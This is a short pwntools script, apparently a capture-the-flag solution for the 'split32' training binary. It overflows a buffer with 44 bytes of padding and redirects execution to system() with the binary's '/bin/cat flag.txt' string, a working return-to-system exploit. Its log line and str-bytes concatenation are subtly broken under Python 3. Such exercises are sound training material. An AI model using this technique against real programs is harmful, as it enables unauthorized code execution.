#!/usr/bin/python3

from pwn import *

#context.log_level = 'DEBUG'

filename = './split32'

binary = ELF(filename)
cat_flag_addr = next(binary.search('/bin/cat flag.txt'))
system_plt = binary.plt['system']

p = process(filename)

p.recvuntil('> ')

p.sendline('A' * 44 + p32(system_plt) + 'JUNK' + p32(cat_flag_addr))

log.info("Flag: {p.recv(1024).decode()}")
